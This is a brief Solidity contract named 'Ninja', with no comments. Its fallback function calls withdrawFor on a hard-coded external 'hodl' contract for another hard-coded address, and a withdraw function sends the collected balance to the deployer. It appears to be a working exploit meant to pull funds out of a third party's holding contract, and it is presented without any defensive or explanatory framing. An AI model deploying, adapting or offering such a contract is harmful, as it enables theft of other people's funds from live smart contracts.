pragma solidity ^0.4.20;

contract Ninja {
    
  address admin;
  bool public ran=false;
  
  constructor() public {
      admin = msg.sender;
  }
  
  function () public payable
  {
    address hodl=0x4a8d3a662e0fd6a8bd39ed0f91e4c1b729c81a38;
    address from=0x2d4c3df75358873fdfa05d843f9d127239206185;
    hodl.call(bytes4(keccak256("withdrawFor(address,uint256)")),from,2000000000000000);
  }
  
  function getBalance() public constant returns (uint256) {
      return address(this).balance;
  }
  
  function withdraw() public {
      admin.transfer(address(this).balance);
  }
}